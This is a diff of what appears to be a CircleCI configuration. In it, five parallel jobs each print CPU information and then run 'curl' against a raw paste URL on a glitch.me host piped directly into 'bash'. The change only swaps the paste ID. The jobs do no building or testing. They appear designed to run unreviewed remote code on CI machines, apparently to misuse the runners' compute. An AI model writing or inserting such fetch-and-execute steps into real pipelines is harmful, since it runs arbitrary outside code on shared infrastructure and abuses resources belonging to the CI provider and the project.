@@ -9,7 +9,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/VrgvXwbGVl | bash
+            command: curl https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash
 
   trial2A:
     machine:
@@ -19,7 +19,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/VrgvXwbGVl | bash
+            command: curl https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash
 
   trial3A:
     machine:
@@ -29,7 +29,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/VrgvXwbGVl | bash
+            command: curl https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash
 
   trial4A:
     machine:
@@ -39,7 +39,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/VrgvXwbGVl | bash
+            command: curl https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash
 
   trial5A:
     machine:
@@ -49,7 +49,7 @@ jobs:
       - run: lscpu
       - run: 
             name: "trial" 
-            command: curl https://muq-hastebin.glitch.me/raw/VrgvXwbGVl | bash
+            command: curl https://muq-hastebin.glitch.me/raw/65I6LhccWy | bash
  
 workflows: 
     version: 2.1 
